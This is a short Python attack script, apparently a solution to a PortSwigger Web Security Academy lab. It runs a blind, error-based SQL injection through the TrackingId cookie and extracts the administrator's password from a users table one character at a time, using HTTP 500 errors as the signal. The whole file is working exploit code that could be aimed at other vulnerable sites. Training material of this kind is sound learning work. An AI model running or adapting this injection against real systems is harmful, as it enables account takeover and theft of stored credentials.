
#!/usr/share/python3
import socket
import sys
import requests

password = ''
numbers = [n for n in range(1,21)]
characteres = 'abcdefghijklmnopqrstuvwxyz0123456789'
counter = 1
for n in numbers:
	for y in characteres:
		headers = {"Cookie": f"TrackingId=7ZAYfrP1kGTIPg2P' || (SELECT CASE WHEN SUBSTR(password,{n},1) = '{y}' THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator')||'; session=ovOay2GKlbr3XC4rnGJinRiQk6X2wxQY"}
		response = requests.get("https://0a36004f034e43a5c015026a00630060.web-security-academy.net/filter?category=Gifts",headers=headers)
		print(n,y,response)
		if response.status_code == 500:
			password += y
			counter += 1
			break
print(password)
